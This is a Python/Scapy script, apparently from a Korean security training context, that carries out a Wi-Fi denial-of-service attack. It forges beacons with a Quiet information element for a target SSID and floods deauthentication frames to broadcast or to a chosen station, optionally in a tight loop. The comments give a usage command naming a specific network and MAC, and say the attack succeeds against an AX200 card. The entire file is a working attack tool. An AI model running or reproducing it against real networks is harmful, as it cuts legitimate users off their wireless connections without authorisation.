from scapy.all import *
import time
import sys
import argparse
import re
import threading

parser = None
mac_list = []
quiet_packets = []
deauth_packets = []
conf.verb=0
# Mentee와 같은 여러개의 채널에 존재하는 AP의 경우 일반적인 CSA로는 연결을 끊을 수 없었음
# 그렇기 때문에 SA Query를 씹는 방식으로 AP가 STA에 연결을 끊도록 유도함
# 현재 AX200에서는 성공함.
#########################################################################################################
#						usage
# 공격을 시작하기 전에 STA이 어느채널에 존재하는 AP에 물려 있는지를 먼저 확인해야 한다.
# python3 quiet_attack.py -i mon0 -v KITRI_Mentee -d broadcast -s 2c:6d:c1:32:90:ba --aggressive True
#########################################################################################################

def quiet_attack(parser):
	while not len(quiet_packets):
		print("[*]Sniffing wild packets")
		sniff(iface=parser.interface, stop_filter = stop_filter_beacon, count = 200)
	print("[*]Quiet Attack Start")
	send_quiet(parser)


###############################################################
#					quiet
###############################################################

def stop_filter_beacon(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		if bytes(parser.ssid,'utf-8') == elt.info and dot11.addr3 not in mac_list:
			print(f"[!]SSID: {elt.info}, MAC:{dot11.addr3}")
			mac_list.append(dot11.addr3)
			make_quiet(parser, elt, dot11)

	return False

def make_quiet(parser, elt, dot11):
	dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
	beacon = Dot11Beacon(cap=0o411)
	frame = RadioTap()/dot11_beacon/beacon
	quiet = Dot11Elt(ID=0x28,len=6,info=bytes([1,255,255,255,0,0]))
	flag = False

	while elt != None:
		if elt.ID > 0x28 and flag == False:
			flag = True
			frame = frame/quiet
		information_element = Dot11Elt(ID=elt.ID, len=len(elt.info), info=elt.info)
		frame = frame/information_element
		elt = elt.payload.getlayer(Dot11Elt)
	quiet_packets.append(frame)
	
	# addr3에 해당하는 Deauth패킷 생성
	if parser.casting == "broadcast":
		dot11_deauth = Dot11(type=0, subtype=0xc, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
	else:
		dot11_deauth = Dot11(type=0, subtype=0xc, addr1=parser.sta, addr2=dot11.addr3, addr3=dot11.addr3)
	deauth = Dot11Deauth(reason=7)
	deauthFrame = RadioTap()/dot11_deauth/deauth
	deauth_packets.append(deauthFrame)
 
def send_quiet_t(parser, frame):
	if parser.aggressive == True:
		sendp(frame, iface=parser.interface, inter=0.004, loop=1)
	else:
		sendp(frame, iface=parser.interface, count = 6)

def send_quiet(parser):
	for i in range(0,len(quiet_packets)):
		t = threading.Thread(target=send_quiet_t, args=(parser,quiet_packets[i]))
		t.start()
		t2 = threading.Thread(target=send_deauth, args=(parser,deauth_packets[i]))
		t2.start()

def send_deauth(parser, frame):
	if parser.aggressive == True:
		sendp(frame, iface=parser.interface, inter=0.004, loop=1)
	else:
		sendp(frame, iface=parser.interface, count = 6)


###############################################################
#						Parser 설정
###############################################################

class PARSER:
	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel = self.channel(opts.channel)
		self.ap = self.mac(opts.ap)
		self.ssid = opts.ssid
		self.casting = self.cast(opts.cast)
		self.sta = self.mac(opts.sta)

		
		self.aggressive = opts.aggressive
	
	def help(self, _help):
		if _help:
			print("HELPPPPPP")

	def mac(self, mac_address):
		if mac_address == None:
			print("No MAC address Given")
			#exit(-1)
	
		if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac_address):
			return mac_address.lower()
		else:
			print("Invalid MAC Address Given")
			#exit(-1)

	def channel(self, ch):
		retval = list(range(1,164))
		if ch:
			if ch in retval:
				return ch
			else:
				print("Invalid Channel Given.")
		else:
			print("No Channel Given")
			#exit(-1)
	
	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					print("Interface Not In Monitor Mode [%s]" % (iface))
					exit(-1)
			else:
				print("Interface Not Found. [%s]" % (iface))
				exit(-1)
		else:
			print("Interface Not Provided. Specify an Interface!")
			exit(-1)

	def cast(self, casting):
		if casting == "unicast" or casting == "broadcast":
			return casting
		else:
			print("Only unicast or broadcast")
			exit(-1)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")
	
	parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
	parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
	parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
	parser.add_argument('-s', '--station', dest='sta', default="", type=str)
	parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)

	parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)
	
	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)

	options = parser.parse_args()
	parser = PARSER(options)
	print(parser.sta)
	quiet_attack(parser)
